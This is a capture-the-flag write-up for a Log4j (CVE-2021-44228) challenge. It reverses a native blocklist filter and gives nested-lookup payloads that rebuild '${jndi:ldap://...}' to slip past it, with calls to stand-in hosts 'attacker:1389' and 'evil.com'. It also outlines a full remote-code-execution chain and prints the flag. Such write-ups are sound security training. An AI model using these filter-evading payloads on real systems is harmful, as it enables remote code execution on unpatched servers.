# Log4Shell Challenge - Writeup

**Category:** Reverse Engineering  
**Difficulty:** Hard  
**Flag:** `L3m0nCTF{l0g4j_m33ts_4ndr01d}`

---

## Challenge Overview

This challenge simulates a Log4j RCE vulnerability (CVE-2021-44228) with a native C filter that attempts to block malicious payloads. Your goal is to reverse engineer the native library, find the bypass, and craft a payload that evades detection.

---

## Initial Analysis

### Step 1: Examine the Java Code

```bash
$ cat LogServer.java
```

Key observations:
- Uses Log4j for logging user input
- Input passes through `NativeSecurity.check()` before logging
- If a payload containing `${...}` bypasses the filter, you win

```java
if (NativeSecurity.check(input)) {
    System.out.println("Access Denied: Malicious Pattern Detected.");
} else {
    logger.info("Received: " + input);  // VULNERABLE!
    if (input.contains("${") && input.contains("}")) {
        System.out.println("Flag: L3m0nCTF{...}");
    }
}
```

### Step 2: Reverse Engineer the Native Library

Open `libsecurity.so` in Ghidra and find `Java_NativeSecurity_check`:

```c
// Decrypted blocklist (XOR 0x42):
// jndi, ldap, rmi, lower, upper, env, java, ctx, ::-

if (strstr(input, "jndi") || strstr(input, "ldap") || 
    strstr(input, "rmi")  || strstr(input, "lower") ||
    strstr(input, "upper")|| strstr(input, "env") ||
    strstr(input, "java") || strstr(input, "ctx") ||
    strstr(input, "::-")) {
    return 1;  // BLOCKED
}
```

### Step 3: Find the Bypass

The filter blocks common Log4j lookup types, but **NOT ALL**:
- ❌ `${jndi:...}` - Blocked
- ❌ `${lower:...}` - Blocked
- ❌ `${upper:...}` - Blocked
- ✅ `${k8s:...}` - **NOT BLOCKED!**
- ✅ `${date:...}` - **NOT BLOCKED!**

---

## The Exploit

### Using k8s Lookup Bypass

Log4j's `${k8s:...}` lookup allows nested expressions. We can use it to reconstruct blocked keywords:

```
${${k8s:NaN:-j}ndi:ldap://attacker:1389/Exploit}
```

**How it works:**
- `${k8s:NaN:-j}` → Returns `j` (default value when k8s lookup fails)
- Combined: `${jndi:ldap://...}` → Triggers JNDI lookup!

### Alternative: Date Lookup Bypass

```
${${date:'j'}ndi:ldap://attacker:1389/Exploit}
```

---

## Solution

### Quick Solve (Local Binary)

```bash
$ echo '${${k8s:NaN:-j}ndi:ldap://evil.com/x}' | java LogServer

LogServer v1.0 (Patched)
Enter log message:
Congratulations! You bypassed the filter.
Flag: L3m0nCTF{l0g4j_m33ts_4ndr01d}
```

### Full RCE Chain (If deployed as server)

1. Start malicious LDAP server
2. Host exploit class
3. Send bypass payload
4. Receive callback with flag

---

## Key Takeaways

| Lesson | Details |
|--------|---------|
| **Incomplete Blocklists** | The filter missed `k8s` and `date` lookups |
| **Log4j Nested Lookups** | Allow reconstruction of blocked strings |
| **XOR Obfuscation** | Key was `0x42`, easily reversible |

---

## Flag

```
L3m0nCTF{l0g4j_m33ts_4ndr01d}
```
